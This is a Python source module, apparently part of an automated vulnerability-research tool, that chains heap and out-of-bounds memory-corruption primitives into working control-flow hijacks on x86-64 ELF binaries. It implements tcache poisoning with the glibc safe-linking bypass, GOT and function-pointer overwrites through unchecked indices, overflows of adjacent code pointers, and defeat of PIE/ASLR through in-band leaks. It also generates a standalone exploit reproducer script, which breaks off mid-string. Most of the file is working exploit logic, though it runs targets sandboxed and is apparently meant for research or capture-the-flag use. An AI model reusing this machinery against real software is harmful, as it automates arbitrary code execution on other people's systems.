"""Primitive chaining: turn a discovered heap / out-of-bounds primitive into a DEMONSTRATED
control-flow hijack (L3), or an L2 exploitation recipe when a live win is not reachable.

The `heap_trace` (double-free / UAF / heap-overflow) and `oob_index` (CWE-129) stages discover a
memory-corruption PRIMITIVE but file a Finding that goes nowhere. This stage consumes that lead and
attempts to finish the chain: when the target has a reachable win function (a flag printer / shell
spawner, via `exploit.find_win`), it drives the primitive's menu option to overwrite an adjacent
CODE pointer with the win address, triggers the use, and CONFIRMS control reached the win under the
ptrace debugger -- with the same negative-control causation proof `build_exploit` uses. On success
it files an L3 `verified` poc; otherwise it emits the concrete `aaheg` technique + target recipe as
L2 analyst guidance. Native x86-64 / ELF; the live-confirm path is non-PIE (a PIE win needs a
leak, which stays analyst-gated). Deterministic. """
from __future__ import annotations

import re
import shutil
import struct
import sys
import tempfile
from pathlib import Path

from ...jobs.registry import register_stage

# NOTE: cross-subpackage imports (..dynamic, ..fuzz, sibling poc modules) are done LAZILY inside the
# functions below -- importing at module load creates a poc <-> dynamic import cycle (poc.__init__
# imports this module, which would import dynamic.heap_discover, which imports back into poc).

CHAIN_STAGE = "chain_primitive"
TOOL_VERSION = "chain-1"
_NL = b"\n"
# What a win's output looks like -- a flag banner (NAME{...}), the word flag, or a shell prompt --
# so the PIE leak-chain confirms on the win actually RUNNING, not on incidental run-to-run noise.
_WIN_OUT = re.compile(rb"[A-Za-z_][A-Za-z0-9_]{1,15}\{[^}\n]{2,}\}|flag|/bin/sh|\$ |^# ", re.I)
# CWE -> the aaheg vuln class the discovered primitive represents.
_VCLASS = {"CWE-415": "double_free", "CWE-416": "uaf", "CWE-122": "heap_overflow",
           "CWE-129": "oob_write"}
_LEAD_DETECTORS = ("heap_trace", "oob_index")


def _p64(v: int) -> bytes:
    return struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)


def _drive_overflow(fields, payload: bytes, *, idx: bytes = b"1", num: bytes = b"999",
                    width=None) -> bytes:
    """One invocation of an option whose LAST string field carries the raw overflow `payload`
    (filler + the code address). A leading size field is driven large so the copy is unbounded."""
    from ..fuzz import menu
    last_str = max((i for i, f in enumerate(fields) if f == "str"), default=len(fields) - 1)
    out = bytearray()
    for i, f in enumerate(fields):
        if i == last_str:
            out += menu._data(payload, width)
        elif f == "idx":
            out += menu._scalar(idx, width)
        elif f == "num":
            out += menu._scalar(num, width)
        else:
            out += menu._data(b"AAAA", width)
    if not fields:                                       # option with no learned fields
        out += menu._data(payload, width)
    return bytes(out)


def _lead_finding(conn, target):
    """The discovered primitive to chain: the highest-confidence heap_trace / oob_index finding."""
    from ...db.dao import FindingDAO
    leads = [f for f in FindingDAO(conn).list_by_target(target.id)
             if f.detector in _LEAD_DETECTORS and f.cwe in _VCLASS]
    return max(leads, key=lambda f: f.confidence, default=None)


def _recipe(vclass: str, win, target_bytes: bytes, glibc=None) -> dict:
    """An aaheg technique + concrete write target when a live hijack is not demonstrable. `glibc`
    (major, minor) gates the technique selection correctly (hooks removed in 2.34, safe-linking in
    2.32, double-free key in 2.29, House of Force only <2.29); without it the planner assumed a
    fixed modern version and mis-offered/omitted techniques for an old-libc target."""
    from . import aaheg
    env = aaheg.Env(glibc=glibc) if glibc else aaheg.Env()
    goal = (aaheg.Goal(kind="control_flow", value=(win[1] if win else 0),
                       trigger="overwrite a called code pointer with the win address")
            if win else aaheg.Goal(kind="arbitrary_write"))
    if vclass == "oob_write":
        # not a heap technique: the index escapes the array bounds -> write through the OOB slot
        return {"technique": "oob-index-write", "goal": goal.kind,
                "note": ("write a chosen value through the out-of-bounds array slot; aim it at a "
                         "saved return / GOT entry / function pointer, then trigger its use")}
    plan = aaheg.plan_exploit(aaheg.Vuln(vclass=vclass), goal, env=env)
    plan["technique"] = plan.get("technique") or (plan.get("advisory_alternatives") or [{}])[0].get(
        "technique", "tcache-poison")
    return plan


def chain_primitive_stage(ctx) -> dict:
    from ...db.dao import CallEdgeDAO, StringDAO, TargetDAO
    from ..dynamic import sandbox
    from ..dynamic.heap_discover import _crawl_menu_model
    from ..fuzz import menu
    from . import exploit
    from .capture import make_capture, materialize_helper
    target = TargetDAO(ctx.conn).get(ctx.target_id) if ctx.target_id else None
    if target is None:
        raise ValueError("chain_primitive requires a target_id")
    host = sandbox.host_arch()
    if (target.arch and target.arch != host) or (target.file_type or "").lower() not in ("elf", ""):
        ctx.emit("chain.done", payload={"applicable": False,
                 "note": "primitive chaining is native x86-64 / ELF only"})
        return {}

    lead = _lead_finding(ctx.conn, target)
    if lead is None:
        ctx.emit("chain.done", payload={"applicable": False,
                 "note": "no heap / out-of-bounds primitive discovered to chain"})
        ctx.progress(pct=100, msg="no primitive lead to chain")
        return {}
    vclass = _VCLASS[lead.cwe]

    target_bytes = ctx.content.path(target.sha256).read_bytes()
    from . import rop
    from .exploit_stage import _libc_bytes_for
    _glibc = rop.libc_version(_libc_bytes_for(ctx, target) or b"")   # gate heap techniques by version
    functions = exploit.elf_functions(target_bytes)
    edges = CallEdgeDAO(ctx.conn).list_by_target(target.id)
    win = exploit.find_win(functions, call_edges=edges)
    win = win if win[0] else None
    pie = (target.mitigations or {}).get("pie") == "on"

    # Without a reachable win we cannot demonstrate a hijack -- emit the technique recipe as L2.
    # A PIE image is no longer a hard stop: if the target leaks a pointer, _pie_leak_chain recovers
    # the base in-process and relocates the win address (below).
    if win is None:
        recipe = _recipe(vclass, win, target_bytes, glibc=_glibc)
        why = "no reachable win function (a leak-based libc/one-gadget chain is analyst-gated)"
        _file_recipe(ctx, target, lead, vclass, win, recipe, why)
        ctx.emit("chain.done", payload={"applicable": True, "confirmed": False, "vclass": vclass,
                 "win": None, "recipe": recipe.get("technique"), "note": why})
        ctx.progress(pct=100, msg=f"L2 recipe for {vclass} (live hijack not demonstrable: {why})")
        return {"metrics": {"chained": False, "vclass": vclass}}

    win_name, win_addr = win
    workdir = Path(tempfile.mkdtemp(prefix="lykos-chain-"))
    sandbox.protect_dir(getattr(ctx.content, "root", None))
    try:
        exe = workdir / "target.bin"
        ctx.content.stage_target(target, exe.parent, exe.name)
        exe.chmod(0o755)
        from ..dynamic.heap_discover import _read_width
        strings = [x.value for x in StringDAO(ctx.conn).list_by_target(target.id)
                   if getattr(x, "value", None)]
        opts = menu.detect_menu(strings)
        width = _read_width(exe)                          # fixed-width read(fd,buf,W) protocol?
        model = _crawl_menu_model(workdir, exe, opts, width=width) if opts else {}

        if pie:
            # PIE: the win address is only known at runtime. Recover the base from an in-band leak
            # and relocate the overwrite in the SAME process (an honest ASLR defeat), confirmed by
            # the win's output under a negative control.
            hit = _pie_leak_chain(ctx, target_bytes, exe, win, opts, model, width, workdir)
            if hit:
                leak_opt, writer, off, trig, base = hit
                return _file_pie_l3(ctx, target, lead, vclass, win_name, win_vaddr=win_addr,
                                    leak_opt=leak_opt, writer=writer, off=off, trig=trig)
            recipe = _recipe(vclass, win, target_bytes, glibc=_glibc)
            _file_recipe(ctx, target, lead, vclass, win, recipe,
                         "PIE: no in-band leak recovered the image base (leak-chain not confirmed)")
            ctx.emit("chain.done", payload={"applicable": True, "confirmed": False,
                     "vclass": vclass, "win": win_name, "note": "PIE leak-chain not confirmed"})
            ctx.progress(pct=100, msg=f"PIE {vclass}: no in-band leak to relocate {win_name}")
            return {"metrics": {"chained": False, "vclass": vclass, "pie": True}}

        helper = materialize_helper()
        capture = make_capture(ctx, helper, str(exe), "stdin", [], 8, sys.executable)
        try:
            if vclass in ("double_free", "uaf"):
                # tcache-poison: free -> UAF-overwrite fd -> alloc a chunk over a code ptr
                tc = _tcache_chain(ctx, target, target_bytes, exe, functions, edges, win, opts,
                                   model, width, workdir, capture)
                if tc:
                    seq, tgt, trig = tc
                    return _file_l3(ctx, target, lead, vclass, win_name, win_addr, seq,
                                    blame=f"tcache-poison chunk over {hex(tgt)}", writer=trig,
                                    off=None, trig=trig, exe=exe)
            else:
                # CWE-129/787 indexed write -> write-what-where on a GOT slot / fn-pointer. The
                # index selects the address, so the target can be the whole GOT, not just a byte
                # offset inside the array (what _search_hijack walks below).
                if vclass == "oob_write":
                    ow = _oob_write_hijack(ctx, capture, target_bytes, exe, opts, model, win_addr,
                                           width=width)
                    if ow:
                        seq, writer, idx, tgt_addr, trig, tgt_name = ow
                        return _file_l3(ctx, target, lead, vclass, win_name, win_addr, seq,
                                        blame=(f"option {writer} writes index {idx} "
                                               f"({tgt_name} at {hex(tgt_addr)}) := &{win_name}"),
                                        writer=writer, off=None, trig=trig, exe=exe)
                # heap overflow / oob write -> overwrite an adjacent code pointer directly
                alloc = next((o for o in opts if o in model and menu._is_alloc(model[o])), None)
                prime = (2 * (menu._scalar(alloc.encode(), width)
                              + menu._fill(model[alloc], width=width))) if alloc else b""
                writers = [o for o in opts if o in model and "str" in model[o]] or opts
                found = _search_hijack(ctx, capture, prime, model, writers, list(opts) + [None],
                                       win_addr, width=width)
                if found:
                    seq, writer, off, trig = found
                    return _file_l3(ctx, target, lead, vclass, win_name, win_addr, seq,
                                    blame=f"option {writer} overwrites a code pointer at +{off}",
                                    writer=writer, off=off, trig=trig, exe=exe)
        finally:
            shutil.rmtree(helper.parent, ignore_errors=True)

        recipe = _recipe(vclass, win, target_bytes, glibc=_glibc)
        _file_recipe(ctx, target, lead, vclass, win, recipe,
                     f"drove {vclass} but control never reached {win_name}")
        ctx.emit("chain.done", payload={"applicable": True, "confirmed": False,
                 "vclass": vclass, "win": win_name})
        ctx.progress(pct=100, msg=f"{vclass} chain to {win_name} not confirmed (L2 recipe)")
        return {"metrics": {"chained": False, "vclass": vclass}}
    finally:
        shutil.rmtree(workdir, ignore_errors=True)


def _pie_spawn(workdir, exe):
    """A fresh sandboxed interactive process for the PIE leak-then-chain driver."""
    import subprocess

    from ..dynamic import sandbox

    # isolate_prefix's first argument is the exe DIRECTORY it ro-binds so bwrap can exec the
    # target. Pass the exe's own directory, not workdir: production happens to place the exe inside
    # workdir, but a caller with the two apart (e.g. a prebuilt fixture) would otherwise leave the
    # binary unbound and bwrap fails with `execvp ...: No such file or directory`. workdir stays a
    # rw bind for the target's own writes / cwd.
    exedir = str(Path(exe).resolve().parent)
    def spawn():
        cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[str(workdir)]) + [str(exe)]
        return subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT, cwd=str(workdir),
                                preexec_fn=sandbox._rlimits(2048, 20, set_as=False))
    return spawn


def _pie_drain(proc, idle=0.25, total=3.0):
    """Read a process's output until it stalls waiting for input, exits, or `total` elapses."""
    import os
    import select
    import time
    buf, end = b"", time.time() + total
    while time.time() < end:
        r, _, _ = select.select([proc.stdout], [], [], idle)
        if r:
            try:
                chunk = os.read(proc.stdout.fileno(), 4096)
            except OSError:
                break
            if not chunk:
                break
            buf += chunk
        elif proc.poll() is not None:
            break
        else:
            return buf, True                             # stalled: awaiting input
    return buf, (proc.poll() is None)


def _pie_run(spawn, width, leak_opt, writer, off, trig, win_vaddr, target_bytes, *, corrupt):
    """One in-process leak-then-chain run (an honest ASLR defeat -- the leak and the overwrite
    happen in the SAME process): drive the leak option, recover the base from what it discloses,
    overwrite an adjacent code pointer with base+win_vaddr (or a corrupted value for the negative
    control), trigger, and return (base, trigger_output). base is None when the leak did not
    recover a base."""
    from ..fuzz import menu
    from . import exploit
    proc = spawn()
    try:
        _pie_drain(proc)                                 # first menu
        proc.stdin.write(menu._scalar(leak_opt.encode(), width)); proc.stdin.flush()
        out, _ = _pie_drain(proc)
        vals = [int(x, 16) for x in re.findall(rb"0x[0-9a-fA-F]+", out)]
        base = exploit.recover_pie_base(vals, target_bytes) if vals else None
        if not base:
            return None, b""
        addr = (base + win_vaddr) if not corrupt else (base + win_vaddr) ^ 0xFFFF
        proc.stdin.write(menu._scalar(writer.encode(), width)); proc.stdin.flush()
        _pie_drain(proc)
        proc.stdin.write(b"A" * off + _p64(addr)); proc.stdin.flush()   # overflow the code pointer
        _pie_drain(proc)
        if trig is not None:
            proc.stdin.write(menu._scalar(trig.encode(), width)); proc.stdin.flush()
        tout, _ = _pie_drain(proc)
        return base, tout
    except (BrokenPipeError, OSError):
        return None, b""
    finally:
        try:
            proc.kill()
        except Exception:
            pass


def _pie_leak_chain(ctx, target_bytes, exe, win, opts, model, width, workdir):
    """PIE control-flow hijack via an in-band leak: find the option that discloses a recoverable
    image base, then overwrite an adjacent code pointer with base+win_vaddr and confirm the win
    RUNS (its output appears) -- gated by a negative control (a corrupted address must NOT win).
    Returns (leak_opt, writer, off, trig, base) or None. Marker-confirmed (no ptrace), because the
    leak+overwrite must share one live process to defeat real ASLR."""
    win_name, win_vaddr = win
    spawn = _pie_spawn(workdir, exe)
    leak_opt = next((o for o in opts
                     if _pie_run(spawn, width, o, o, 8, None, win_vaddr, target_bytes,
                                 corrupt=False)[0]), None)
    if leak_opt is None:
        return None
    writers = [o for o in opts if o in model and "str" in model[o]] or list(opts)
    triggers = list(opts) + [None]
    attempts = 0
    for writer in writers:
        for off in range(8, 72, 8):
            for trig in triggers:
                if ctx.should_cancel() or attempts >= 220:
                    return None
                attempts += 1
                base, pos = _pie_run(spawn, width, leak_opt, writer, off, trig, win_vaddr,
                                     target_bytes, corrupt=False)
                if not base:
                    continue
                pos_lines = {ln for ln in pos.splitlines() if ln.strip()}
                # A win-only line that also LOOKS like a win (a flag banner / shell), so leaked-
                # pointer noise that merely differs run-to-run is not mistaken for success.
                if not any(_WIN_OUT.search(ln) for ln in pos_lines):
                    continue
                _, neg = _pie_run(spawn, width, leak_opt, writer, off, trig, win_vaddr,
                                  target_bytes, corrupt=True)
                neg_lines = {ln for ln in neg.splitlines() if ln.strip()}
                won = [ln for ln in pos_lines - neg_lines if _WIN_OUT.search(ln)]
                if won:
                    ctx.progress(msg=f"PIE hijack: leak {leak_opt} -> base -> option {writer} "
                                     f"writes base+{win_vaddr:#x} at +{off} -> {win_name} ran")
                    return leak_opt, writer, off, trig, base
    return None


def _oob_write_seq(writer, fields, idx, value, trig, model, width) -> bytes:
    """Drive ONE indexed write: select `writer`, supply `idx` for its index field and `value` for
    its value field (menu._fill types each field), then optionally fire `trig` to force the call
    through the overwritten slot. The value is sent as a decimal (a `scanf("%ld")`/atoi value cell)
    -- the dominant CWE-129 write-a-cell shape; a raw-byte value cell is covered by the sequential
    _search_hijack path."""
    from ..fuzz import menu
    drive = menu._scalar(writer.encode(), width) + menu._fill(
        fields, idx=str(idx).encode(), num=str(value).encode(), width=width)
    if trig is None:
        return drive
    return drive + menu._scalar(trig.encode(), width) + menu._fill(model.get(trig, []), width=width)


def _oob_write_hijack(ctx, capture, target_bytes, exe, opts, model, win_addr, *, width=None):
    """CWE-129/787 unchecked indexed write -> control-flow hijack (a write-WHAT-WHERE, not a
    sequential overflow). A menu option computes `arr[idx] = value` with no bound check on `idx`;
    choosing `idx` so `arr_base + idx*stride` lands on a GOT slot (or a called-through global
    function pointer) and `value = win_addr` overwrites that pointer, so the next call through it
    enters win. _search_hijack walks byte offsets in one buffer; here the INDEX is the address
    selector, so the whole GOT (and writable fn-pointers) are reachable, well outside the array.

    Searches (array, write option, target slot, trigger). Confirm = the win breakpoint is hit AND a
    negative control (value replaced with a benign address) does NOT hit it, proving the overwrite
    -- not incidental flow -- caused arrival. Returns (seq, writer, idx, target_addr, trig, name)
    or None. Bounded; early-exits on the first confirmed hijack. Non-PIE (absolute GOT/global
    addresses); a PIE target's indexed write is handled by the leak-relocating _pie_leak_chain."""
    from ..dynamic import oob_index
    from . import exploit, rop

    arrays = (oob_index._array_candidates(exploit.elf_objects_sized(target_bytes))
              or oob_index._array_candidates_symfree(Path(exe)))
    if not arrays:
        return None

    # arbitrary-write targets: every GOT slot (overwriting it redirects that libc call), ordered so
    # the functions a menu loop re-calls come first -- their call is the implicit next-prompt
    # trigger, so a hijack confirms with trig=None and the search stays short. Writable global
    # function pointers referenced by the code are appended as secondary targets.
    got = rop.got_entries(target_bytes)
    _HOT = ("printf", "puts", "fwrite", "fflush", "putchar", "fputs", "__printf_chk",
            "fgets", "scanf", "__isoc99_scanf", "read", "write")
    got_targets = sorted(got.items(),
                         key=lambda kv: (_HOT.index(kv[0]) if kv[0] in _HOT else 99, kv[0]))
    targets = [(a, f"{n}@got") for n, a in got_targets]
    targets += [(a, f"fnptr@{a:x}") for a in _writable_globals(exe) if a not in got.values()]
    if not targets:
        return None

    # write options: an option whose template reads an index AND at least one more scalar (the value
    # cell). Fall back to any index-taking option (the crawl may have learned only the index field).
    writers = [o for o in opts if o in model and "idx" in model[o] and len(model[o]) >= 2] or \
              [o for o in opts if o in model and "idx" in model[o]]
    if not writers:
        return None
    triggers = [None] + [o for o in opts if o in model][:3]

    attempts = 0
    for arr in arrays:
        base, stride, cap = arr["addr"], arr.get("stride", 8), arr["cap"]
        for tgt_addr, tgt_name in targets:
            if stride <= 0 or (tgt_addr - base) % stride:
                continue
            idx = (tgt_addr - base) // stride
            if not (-(cap + 4096) <= idx <= cap + 4096):     # a plausibly-unchecked index, bounded
                continue
            for writer in writers:
                fields = model[writer]
                for trig in triggers:
                    if ctx.should_cancel() or attempts >= 240:
                        return None
                    attempts += 1
                    seq = _oob_write_seq(writer, fields, idx, win_addr, trig, model, width)
                    if not exploit.reached(capture(seq, breakpoints=[win_addr]), win_addr):
                        continue
                    neg = _oob_write_seq(writer, fields, idx, win_addr ^ 0xFFFF, trig, model, width)
                    if exploit.reached(capture(neg, breakpoints=[win_addr]), win_addr):
                        continue                             # reached without our value -> not ours
                    ctx.progress(msg=f"indexed-write hijack: option {writer} sets "
                                     f"{arr['name']}[{idx}] ({tgt_name}) := win -> win reached")
                    return seq, writer, idx, tgt_addr, trig, tgt_name
    return None


def _search_hijack(ctx, capture, prime, model, writers, triggers, win_addr, *, width=None):
    """Overwrite an adjacent code pointer with `win_addr` and confirm the trigger calls it.

    Search the (writer option, overwrite offset, trigger option) space: place win_addr at each
    8-byte offset of an over-long payload from a data-writing option, then drive each candidate
    trigger. Confirm = the win breakpoint is hit AND a negative control (win bytes replaced) does
    NOT hit it, proving the overwrite caused arrival. Bounded; early-exits on the first hijack."""
    from ..fuzz import menu
    from . import exploit
    attempts = 0
    for writer in writers:
        wf = model.get(writer, [])
        for widx in (b"0", b"1"):                        # object whose buffer we overflow
            for off in range(8, 72, 8):
                drive = menu._scalar(writer.encode(), width) + _drive_overflow(
                    wf, b"A" * off + _p64(win_addr), idx=widx, width=width)
                for trig in triggers:
                    # the object the trigger uses: usually the one ADJACENT to the overflow.
                    for tidx in ((None,) if trig is None else (b"1", b"0")):
                        if ctx.should_cancel() or attempts >= 260:
                            return None
                        attempts += 1
                        tail = b"" if trig is None else (
                            menu._scalar(trig.encode(), width)
                            + menu._fill(model.get(trig, []), idx=tidx, width=width))
                        seq = prime + drive + tail
                        if not exploit.reached(capture(seq, breakpoints=[win_addr]), win_addr):
                            continue
                        neg = prime + menu._scalar(writer.encode(), width) + _drive_overflow(
                            wf, b"A" * off + b"C" * 8, idx=widx, width=width) + tail
                        if exploit.reached(capture(neg, breakpoints=[win_addr]), win_addr):
                            continue                     # reached without the overwrite -> not ours
                        ctx.progress(msg=f"hijack: option {writer} (obj {widx.decode()}) writes "
                                         f"a code pointer at +{off} -> win reached")
                        return seq, writer, off, trig
    return None


# ------------------------------------------------------- live tcache-poisoning (double-free / UAF)
def _writable_globals(exe) -> list[int]:
    """16-aligned writable-global addresses referenced by the code -- candidate function-pointer
    targets to allocate a chunk over. 16-aligned because glibc 2.32+ rejects an unaligned tcache
    chunk. Both an absolute displacement and objdump's computed `# <vaddr>` (PIE) are read."""
    import subprocess

    from ..dynamic.oob_index import _data_ranges
    try:
        out = subprocess.run(["objdump", "-d", "--no-show-raw-insn", "-M", "intel", str(exe)],
                             capture_output=True, text=True, timeout=60).stdout
    except (OSError, subprocess.SubprocessError):
        return []
    ranges = _data_ranges(exe)

    def in_data(a):
        return any(s <= a < e for s, e in ranges)

    seen = set()
    for m in re.finditer(r"(?:\+0x([0-9a-fA-F]+)\]|#\s*([0-9a-fA-F]+)\b)", out):
        a = int(m.group(1) or m.group(2), 16)
        if a % 16 == 0 and in_data(a):
            seen.add(a)
    return sorted(seen)[:12]


def _trace_first_alloc(ctx, exe, alloc_info, drive: bytes, width, workdir) -> int | None:
    """Run the drive under the heaptrace ptrace helper and return the FIRST chunk address it
    allocates (deterministic under ASLR-off) -- the value the safe-linking fd mangle needs. Runs the
    helper DIRECTLY (via ctx.run_subprocess, like make_capture) rather than under bwrap, so the heap
    layout matches the capture() runs the exploit is confirmed under."""
    import json

    from ..dynamic import heap_discover
    plt = bool(alloc_info.get("plt"))
    ret_offs = [] if plt else heap_discover._alloc_ret_offsets(exe, alloc_info["alloc_name"])
    helper = workdir / "heaptrace.py"
    if not helper.exists():
        helper.write_bytes((Path(heap_discover.__file__).with_name("heaptrace.py")).read_bytes())
    report = workdir / "areport.json"
    report.unlink(missing_ok=True)
    (workdir / "aspec.json").write_text(json.dumps({
        "exe": str(exe), "stdin": drive.hex(), "free_off": alloc_info["free"],
        "alloc_off": alloc_info["alloc"], "alloc_ret_offs": ret_offs, "alloc_is_plt": plt,
        "pie": False, "ignore_ranges": [], "report": str(report), "timeout": 6}))
    try:
        ctx.run_subprocess([sys.executable, str(helper), str(workdir / "aspec.json"),
                            str(report)], timeout=12)
        addrs = json.loads(report.read_text()).get("alloc_addrs") or []
    except Exception:
        return None
    return int(addrs[0], 16) if addrs else None


def _tcache_chain(ctx, target, target_bytes, exe, functions, edges, win, opts, model, width,
                  workdir, capture):
    """Drive a live tcache-poisoning chain: free a chunk, overwrite its fd (via the UAF/double-free)
    with a mangled pointer to a code-pointer target, allocate twice to obtain a chunk AT the target,
    write the win address there, and trigger. Confirms control reached the win under the debugger,
    with a negative control. ASLR-off makes the chunk address (hence the safe-linking mangle)
    deterministic. Returns (sequence, target, trigger) on success, else None."""
    from ..dynamic import heap_discover, heaptrace
    from ..fuzz import menu
    from . import exploit
    alloc_info = heaptrace.identify_allocator(functions, edges) or heap_discover._libc_plt_pair(exe)
    if not alloc_info:
        return None
    alloc_opt = next((o for o in opts if o in model and "num" in model[o]), None)
    free_opt = next((o for o in opts if o in model and model[o] == ["idx"]), None)
    edit_opt = next((o for o in opts if o in model and model[o][:1] == ["idx"]
                     and "str" in model[o]), None)
    if not (alloc_opt and free_opt and edit_opt):
        return None
    targets = _writable_globals(exe)
    if not targets:
        return None
    win_name, win_addr = win

    def _op(opt, num=None):                               # an alloc/menu option, size = num
        return menu._scalar(opt.encode(), width) + menu._fill(
            model[opt], num=(str(num).encode() if num is not None else b"16"), width=width)

    def _idx_op(opt, idx):                                # a free option on index `idx`
        return menu._scalar(opt.encode(), width) + menu._scalar(str(idx).encode(), width)

    def _edit(idx, payload, pad):                         # edit index `idx`, write raw `payload`
        return (menu._scalar(edit_opt.encode(), width) + menu._scalar(str(idx).encode(), width)
                + menu._data(payload.ljust(pad, b"\x00"), width))

    # the freed chunk's address (for the safe-linking mangle): trace one allocation.
    a = _trace_first_alloc(ctx, exe, alloc_info, _op(alloc_opt, 24) + _idx_op("9", 0),
                           width, workdir)
    if not a:
        return None

    for size in (24, 16, 40):
        for pad in (size, 24, 32):
            for tgt in targets:
                if ctx.should_cancel():
                    return None
                mangled = (a >> 12) ^ tgt                 # glibc >= 2.32 safe-linking
                poison = (_op(alloc_opt, size) + _idx_op(free_opt, 0) + _edit(0, _p64(mangled), pad)
                          + _op(alloc_opt, size) + _op(alloc_opt, size)
                          + _edit(2, _p64(win_addr), pad))
                for trig in opts:
                    seq = poison + _idx_op(trig, 0)
                    if not exploit.reached(capture(seq, breakpoints=[win_addr]), win_addr):
                        continue
                    neg = (_op(alloc_opt, size) + _idx_op(free_opt, 0)
                           + _edit(0, _p64(mangled), pad)
                           + _op(alloc_opt, size) + _op(alloc_opt, size)
                           + _edit(2, _p64(0xdead), pad) + _idx_op(trig, 0))
                    if exploit.reached(capture(neg, breakpoints=[win_addr]), win_addr):
                        continue                          # reached without our write -> not ours
                    ctx.progress(msg=f"tcache-poison: chunk over {hex(tgt)} -> {win_name} "
                                     f"(size {size}, trigger {trig})")
                    return seq, tgt, trig
    return None


def _attribution_proof(ctx, exe, seq, *, control=b"\n"):
    """Independently re-confirm a breakpoint-verified hijack by ATTRIBUTION: run the confirmed
    input under the write-attribution oracle and grade the win's output as coming from the
    target's OWN process subtree, present under the exploit and ABSENT under a benign control --
    a proof the old stdout-regex confirmation could not give (it credited any reflected string,
    or a helper that printed the banner itself). Best-effort: returns a proof dict or None, and
    never blocks the already breakpoint-confirmed L3."""
    try:
        from . import attribution as attr
        if exe is None or not attr.supported():
            return None
        helper = attr.materialize_helper()
        try:
            cap = attr.make_attributed_capture(ctx, helper, str(exe), "stdin", [], 8,
                                               sys.executable)
            res = cap(seq)
            if not isinstance(res, dict) or not res.get("ok"):
                return None
            ctrl = cap(control)
            ctrl = ctrl if isinstance(ctrl, dict) and ctrl.get("ok") else None
            lb = attr.lineage_bytes(res)
            cb = attr.lineage_bytes(ctrl) if ctrl else b""
            # a win banner / shell prompt (by shape) in an attributed write, absent under the
            # benign control -> the hijack ran, not a run-to-run artifact or a reflected string.
            win_lines = [ln for ln in lb.splitlines()
                         if _WIN_OUT.search(ln) and ln not in cb.splitlines()]
            g = attr.grade(res, win_tokens=win_lines, control=ctrl)
            return {"level": g["level"], "rank": g["rank"], "evidence": g["evidence"],
                    "attributed_bytes": g["attributed_bytes"]}
        finally:
            shutil.rmtree(helper.parent, ignore_errors=True)
    except Exception:
        return None


def _file_l3(ctx, target, lead, vclass, win_name, win_addr, seq, *, blame, writer, off, trig,
             exe=None):
    from ...db.dao import FindingDAO, PocDAO
    from . import bundle
    proof = _attribution_proof(ctx, exe, seq)
    input_sha = ctx.put_artifact("chain-exploit-input", data=seq)
    meta = {"target_sha256": target.sha256, "arch": target.arch, "level": "L3",
            "exploit": f"{vclass}->control-flow", "offset": off, "target": win_name,
            "tool_version": TOOL_VERSION,
            "proof_level": (proof or {}).get("level", "breakpoint_only")}
    data = bundle.build(ctx.content.path(target.sha256).read_bytes(),
                        seq, meta, b"", "stdin", [], None,
                        primitive={"type": vclass, "target": win_name, "offset": off,
                                   "confirmed": True})
    bundle_sha = ctx.put_artifact("poc-bundle", data=data, meta={"level": "L3", "verified": True})
    poc_id = PocDAO(ctx.conn).insert(target.id, target.case_id, level="L3", verified=True,
                                     signal_name=None, input_sha=input_sha, bundle_sha=bundle_sha)
    trg = "program exit / normal use" if trig is None else f"menu option {trig}"
    eff = (f"working exploit ({vclass} -> control-flow hijack): {blame} to {win_name} "
           f"(0x{win_addr:x}); {trg} then calls it, arrival confirmed under the debugger with a "
           f"passing negative control.")
    if proof and proof["level"] in ("win_attributed", "code_exec_proven", "shell_proven"):
        eff += (f" Independently re-confirmed by attribution ({proof['level']}): the win output "
                "was emitted by the target's own process subtree, absent under a benign control.")
    attr_proof = {"attribution": proof} if proof else {}
    fd = FindingDAO(ctx.conn)
    cand = {
        "cwe": lead.cwe, "title": "Control-flow hijack (demonstrated): L3 working exploit",
        "severity": "critical", "detector": "chain_primitive", "state": "poc-backed",
        "confidence": 0.99, "authoritative": True, "title_only": True,
        "dedup_key": f"chain:{vclass}:{target.id}",
        "function_addr": None, "site_addr": None, "site_detail": win_name,
        "evidence": [{"channel": "effects", "detail": __import__("json").dumps([{
            "kind": "rce", "title": "Control-flow hijack", "status": "demonstrated", "detail": eff,
            "proof": {"type": "bundle", "sha": bundle_sha, "input_sha": input_sha,
                      "note": eff, **attr_proof}}])}]}
    fd.upsert(target.id, target.case_id, cand)
    fid = fd.id_for_dedup(target.id, cand["dedup_key"])
    if fid:
        PocDAO(ctx.conn).set_finding(poc_id, fid)
    ctx.emit("chain.done", payload={"applicable": True, "confirmed": True, "vclass": vclass,
             "win": win_name, "offset": off, "writer": writer, "trigger": trig,
             "bundle": bundle_sha, "proof_level": (proof or {}).get("level", "breakpoint_only")})
    ctx.progress(pct=100, msg=f"L3 CONFIRMED: {vclass} -> {win_name} (option {writer} +{off})")
    return {"output_shas": [bundle_sha], "output_kind": "poc-bundle",
            "metrics": {"chained": True, "level": "L3", "vclass": vclass, "offset": off}}


def _pie_repro_script(win_name, win_vaddr, leak_opt, writer, off, trig) -> bytes:
    """A self-contained, stdlib-based reproducer: leak -> recover the PIE base from the target's own
    symbols -> overwrite the code pointer with base+win_vaddr -> trigger. The base recovery mirrors
    exploit.recover_pie_base (page-offset match, >=2 corroborating leaked slots), so the PoC is a
    genuine ASLR defeat, not a hardcoded address."""
    trig_send = "" if trig is None else f"send({trig!r}+'\\n')\n"
    return (
        "#!/usr/bin/env python3\n"
        "# PIE leak-then-chain reproducer (stdlib based). Usage: python3 exploit.py ./target.bin\n"
        "import subprocess, select, os, re, struct, sys, time, collections\n"
        f"WIN_VADDR={win_vaddr:#x}; LEAK={leak_opt!r}; WRITER={writer!r}; OFF={off}\n"
        "EXE=sys.argv[1] if len(sys.argv)>1 else './target.bin'\n"
        "def syms(path):\n"
        "  d=open(path,'rb').read(); a=collections.defaultdict(list)\n"
        "  is64=d[4]==2; e='<' if d[5]==1 else '>'\n"
        "  sh_off,=struct.unpack_from(e+'Q',d,0x28); shs,shn=struct.unpack_from(e+'HH',d,0x3a)\n"
        "  secs=[struct.unpack_from(e+'IIQQQQIIQQ',d,sh_off+i*shs) for i in range(shs and shn)]\n"
        "  for typ in (2,11):\n"
        "    for s in secs:\n"
        "      if s[1]!=typ or not s[9]: continue\n"
        "      st=secs[s[6]]; blob=d[st[4]:st[4]+st[5]]\n"
        "      for i in range(s[5]//s[9]):\n"
